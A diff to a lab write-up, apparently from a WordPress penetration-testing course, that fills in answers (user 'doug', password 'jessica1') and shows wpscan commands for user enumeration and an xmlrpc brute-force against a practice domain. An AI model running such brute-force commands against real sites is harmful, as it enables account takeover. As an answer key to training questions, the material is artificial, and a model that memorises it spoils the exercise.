@@ -52,7 +52,7 @@ Server username: www-data (33)
 ```
 
 ## Questions
-1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? **Answer:**
+1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? **Answer: doug**
    - Run `wpscan` on the target:
         ```shellsession
         $ wpscan --url blog.inlanefreight.local --enumerate --api-token <API_TOKEN>
@@ -60,7 +60,7 @@ Server username: www-data (33)
         | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
         | Confirmed By: Login Error Messages (Aggressive Detection)
         ```
-2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer. **Answer:**
+2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer. **Answer: jessica1**
    - Perform `xmlrpc` bruteforcing attack against `doug`:
         ```shellsession
         $ wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -U doug -P /usr/share/wordlists/rockyou.txt 
